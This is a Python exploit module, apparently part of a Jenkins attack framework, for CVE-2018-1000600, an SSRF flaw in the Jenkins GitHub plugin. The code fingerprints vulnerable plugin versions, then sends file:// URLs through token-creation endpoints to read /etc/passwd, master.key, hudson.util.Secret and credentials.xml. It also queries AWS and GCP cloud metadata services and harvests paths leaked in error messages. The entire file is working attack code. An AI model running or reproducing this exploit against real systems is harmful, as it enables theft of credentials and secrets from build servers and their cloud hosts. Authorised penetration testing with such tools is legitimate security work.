"""
CVE-2018-1000600: Jenkins GitHub Plugin Arbitrary File Read

This vulnerability abuses the GitHub plugin's token creation endpoint to read
arbitrary files from the Jenkins controller filesystem via SSRF.
"""

import re
from typing import Any
from urllib.parse import quote

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2018_1000600(ExploitModule):
    """GitHub plugin SSRF allowing arbitrary file read from controller filesystem."""

    CVE_ID = "CVE-2018-1000600"

    METADATA = ExploitMetadata(
        cve_id="CVE-2018-1000600",
        name="Jenkins GitHub Plugin Arbitrary File Read",
        description="SSRF via GitHub plugin allowing arbitrary file read from controller filesystem",
        affected_versions=["GitHub Plugin <= 1.29.1"],
        mitre_attack=["T1005", "T1552.001", "T1083"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2018-07-18/",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1000600",
            "https://securityboulevard.com/2019/03/jenkins-cve-2018-1000600-poc"
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["file-read", "ssrf", "github-plugin"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has vulnerable GitHub plugin.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable GitHub plugin detected, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                plugins = data.get('plugins', [])

                for plugin in plugins:
                    if 'github' in plugin.get('shortName', '').lower():
                        version = plugin.get('version', '')

                        try:
                            version_parts = version.split('.')
                            if len(version_parts) >= 2:
                                major = int(version_parts[0])
                                minor = int(version_parts[1])

                                if major == 1 and minor <= 29:
                                    return True
                        except (ValueError, IndexError):
                            return True

            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2018-1000600 for arbitrary file read via SSRF.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (target_files list or string)

        Returns:
            ExploitResult: Result of the exploit
        """
        target_files = kwargs.get('target_files', [
            '/etc/passwd',
            '/var/jenkins_home/secrets/master.key',
            '/var/jenkins_home/secrets/hudson.util.Secret',
            '/var/jenkins_home/credentials.xml',
            '/var/jenkins_home/config.xml',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\jenkins\\secrets\\master.key'
        ])

        if isinstance(target_files, str):
            target_files = [target_files]

        read_files = []

        vulnerable_endpoints = [
            '/descriptorByName/com.cloudbees.jenkins.GitHubPushTrigger/GitHubTokenCredentialsCreator/createTokenByPassword',
            '/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword',
            '/descriptor/org.jenkinsci.plugins.github.config.GitHubServerConfig/GitHubTokenCredentialsCreator/createTokenByPassword'
        ]

        for target_file in target_files:
            file_url_variants = [
                f"file://{target_file}",
                f"file:///{target_file}",
                f"file://localhost{target_file}",
            ]

            for endpoint in vulnerable_endpoints:
                for file_url in file_url_variants:
                    try:
                        response = session.get(f"{endpoint}?apiUrl={quote(file_url)}")

                        if response.status_code == 200:
                            content = response.text

                            if len(content) > 0 and '<html' not in content.lower()[:100]:
                                if 'root:' in content or 'jenkins' in content or len(content) > 20:
                                    read_files.append({
                                        "file": target_file,
                                        "endpoint": endpoint,
                                        "size": len(content),
                                        "preview": content[:300] + "..." if len(content) > 300 else content
                                    })
                                    break

                        elif response.status_code in [400, 500]:
                            error_patterns = [
                                r'FileNotFoundException.*?([^\s]+)',
                                r'No such file.*?([^\s]+)',
                                r'Access denied.*?([^\s]+)',
                            ]

                            for pattern in error_patterns:
                                match = re.search(pattern, response.text, re.IGNORECASE)
                                if match:
                                    break

                    except Exception:
                        pass

                if any(f["file"] == target_file for f in read_files):
                    break

        try:
            metadata_urls = [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
            ]

            for endpoint in vulnerable_endpoints[:1]:
                for metadata_url in metadata_urls:
                    try:
                        response = session.get(f"{endpoint}?apiUrl={quote(metadata_url)}")

                        if response.status_code == 200 and len(response.text) > 0:
                            read_files.append({
                                "file": metadata_url,
                                "type": "ssrf_metadata",
                                "size": len(response.text),
                                "preview": response.text[:200]
                            })
                            break
                    except Exception:
                        pass

        except Exception:
            pass

        try:
            for endpoint in vulnerable_endpoints[:1]:
                test_url = f"{endpoint}?apiUrl=file:///var/jenkins_home/"

                response = session.get(test_url)

                if 'is a directory' in response.text or 'FileNotFoundException' in response.text:
                    path_matches = re.findall(r'/[a-zA-Z0-9/_.-]+', response.text)
                    if path_matches:
                        read_files.append({
                            "type": "path_disclosure",
                            "paths": list(set(path_matches))[:10]
                        })

        except Exception:
            pass

        if read_files:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details=f"Arbitrary file read successful, accessed {len(read_files)} resources",
                data={
                    "files_read": len(read_files),
                    "files": read_files
                }
            )
        else:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="Could not exploit GitHub plugin SSRF vulnerability"
            )
